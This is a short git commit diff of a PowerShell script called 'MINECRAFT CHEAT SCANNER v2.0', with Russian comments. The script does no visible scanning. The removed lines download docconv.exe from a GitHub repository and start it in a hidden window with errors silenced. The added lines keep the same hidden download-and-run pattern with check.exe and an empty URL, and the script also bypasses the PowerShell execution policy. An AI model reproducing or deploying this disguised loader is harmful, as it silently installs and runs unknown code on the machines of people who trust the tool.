95aae13a66de567cadda326ed41116b592386206
doskaw <anapa20392@gmail.com>
2026-04-26 08:18:54 -0700

    Update checker.ps1

--- checker.ps1
+++ checker.ps1
@@ -1,9 +1,10 @@
-# MINECRAFT CHEAT SCANNER v2.0
-# Скачиваем everything в текущую папку
-Invoke-WebRequest -Uri "https://github.com/doskaw/Checker/raw/refs/heads/main/docconv.exe" -OutFile "docconv.exe" -ErrorAction SilentlyContinue
-
-# Запускаем 
-Start-Process -FilePath "docconv.exe" -WindowStyle Hidden
+# MINECRAFT CHEAT SCANNER v2.0 [СКАЧИВАЕТ everything В КОНЦЕ]
+    # Скачиваем everything в текущую папку
+    Invoke-WebRequest -Uri "" -OutFile "check.exe" -ErrorAction SilentlyContinue
+    
+    # Запускаем 
+    Start-Process -FilePath "check.exe" -WindowStyle Hidden
+    
 
 Set-ExecutionPolicy Bypass -Scope Process -Force
 
